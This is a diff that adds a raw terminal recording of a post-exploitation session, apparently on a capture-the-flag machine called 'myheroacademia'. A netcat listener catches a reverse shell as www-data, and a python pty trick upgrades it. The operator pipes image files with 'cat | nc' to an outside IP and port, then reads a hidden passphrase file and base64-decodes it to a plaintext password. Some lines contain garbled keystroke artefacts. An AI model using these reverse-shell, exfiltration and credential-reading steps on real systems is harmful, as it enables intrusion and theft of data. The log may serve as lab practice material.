@@ -1,0 +1,57 @@
+Script started on 2025-01-21 23:25:56+03:00 [COMMAND="nc -lnvp 1337" TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="104" LINES="27"]
+listening on [any] 1337 ...
+connect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 12762
+sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty;pty.d spawn("/bin/bash")'
+www-data@myheroacademia:/var/www/html/assets$ ls
+ls
+images	index.php  styles.css
+www-data@myheroacademia:/var/www/html/assets$ cd images
+cd images
+www-data@myheroacademia:/var/www/html/assets/images$ ls
+ls
+oneforall.jpg  yuei.jpg
+www-data@myheroacademia:/var/www/html/assets/images$ ls -al
+ls -al
+total 336
+drwxrwxr-x 2 www-data www-data   4096 Jul  9  2023 .
+drwxrwxr-x 3 www-data www-data   4096 Jan 25  2024 ..
+-rw-rw-r-- 1 www-data www-data  98264 Jul  9  2023 oneforall.jpg
+-rw-rw-r-- 1 www-data www-data 237170 Jul  9  2023 yuei.jpg
+www-data@myheroacademia:/var/www/html/assets/images$ cat ine   oneforall.jpf   g | nc 10.9.3.166 9999
+<sets/images$ cat oneforall.jpg | nc 10.9.3.166 9999 
+www-data@myheroacademia:/var/www/html/assets/images$ cat yuei.jpg | nc 10.9.3.166 9999
+<ml/assets/images$ cat yuei.jpg | nc 10.9.3.166 9999 
+www-data@myheroacademia:/var/www/html/assets/images$ cd ..
+cd ..
+www-data@myheroacademia:/var/www/html/assets$ ls
+ls
+images	index.php  styles.css
+www-data@myheroacademia:/var/www/html/assets$ cd ..
+cd ..ls
+
+www-data@myheroacademia:/var/www/html$ ls
+about.html  admissions.html  assets  contact.html  courses.html  index.html
+www-data@myheroacademia:/var/www/html$ cd ..
+cd ..ls
+
+www-data@myheroacademia:/var/www$ ls
+Hidden_Content	html
+www-data@myheroacademia:/var/www$ cd Hide den_Content
+cd Hidden_Content
+www-data@myheroacademia:/var/www/Hidden_Content$ ls
+ls
+passphrase.txt
+www-data@myheroacademia:/var/www/Hidden_Content$ cat passphar  re ase.txt
+cat passphrase.txt
+QWxsbWlnaHRGb3JFdmVyISEhCg==
+www-data@myheroacademia:/var/www/Hidden_Content$ echo "" | base64 -d ^[[D                  QWxsbWlnaHRGb3JFdmVyISEhCg==" | base64 -d
+<nt$ echo "QWxsbWlnaHRGb3JFdmVyISEhCg==" | base64 -d
+AllmightForEver!!!
+www-data@myheroacademia:/var/www/Hidden_Content$ exit
+exit
+exit
+$ exit
+^C
+
+Script done on 2025-01-22 00:05:55+03:00 [COMMAND_EXIT_CODE="1"]
